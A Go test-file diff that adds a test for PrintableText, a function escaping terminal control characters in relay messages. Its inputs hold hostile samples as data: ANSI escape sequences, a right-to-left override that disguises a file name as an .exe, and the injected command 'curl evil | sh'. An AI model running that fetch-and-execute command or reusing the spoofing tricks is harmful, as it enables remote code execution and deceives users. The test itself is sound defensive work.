@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/base64"
 	"errors"
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -379,6 +380,34 @@ func TestPrintableEscapesWhatANameMayNotCarry(t *testing.T) {
 		for i := 0; i < len(Printable(tc.in)); i++ {
 			if c := Printable(tc.in)[i]; c < 0x20 || c == 0x7f || c >= 0x80 {
 				t.Errorf("Printable(%q) carries byte %#x to the terminal", tc.in, c)
+			}
+		}
+	}
+}
+
+// PrintableText is for a sentence with no rule of its own, a relay's
+// refusal above all: what a terminal shows is kept as it is, quotes,
+// backslashes, spaces and tabs among it, and what a terminal would obey is
+// escaped as strconv.Quote escapes it.
+func TestPrintableTextKeepsProseAndEscapesTheRest(t *testing.T) {
+	for _, tc := range []struct{ in, want string }{
+		{"no such channel", "no such channel"},
+		{`name is "."`, `name is "."`},
+		{`a back\slash and a	tab`, `a back\slash and a	tab`},
+		{"no\x1b[2K\x1b[1;31m such thing\nrun: curl evil | sh", `no\x1b[2K\x1b[1;31m such thing\nrun: curl evil | sh`},
+		{"build-box\u202egnp.exe", `build-box\u202egnp.exe`},
+		{"para\u2029graph", `para\u2029graph`},
+		{"café 中", "café 中"},
+		{"\xff\xfe", `\xff\xfe`},
+		{"\x7f", `\x7f`},
+		{"", ""},
+	} {
+		if got := PrintableText(tc.in); got != tc.want {
+			t.Errorf("PrintableText(%q) = %q, want %q", tc.in, got, tc.want)
+		}
+		for i, r := range PrintableText(tc.in) {
+			if r != ' ' && r != '\t' && !strconv.IsPrint(r) {
+				t.Errorf("PrintableText(%q) carries %U at %d to the terminal", tc.in, r, i)
 			}
 		}
 	}
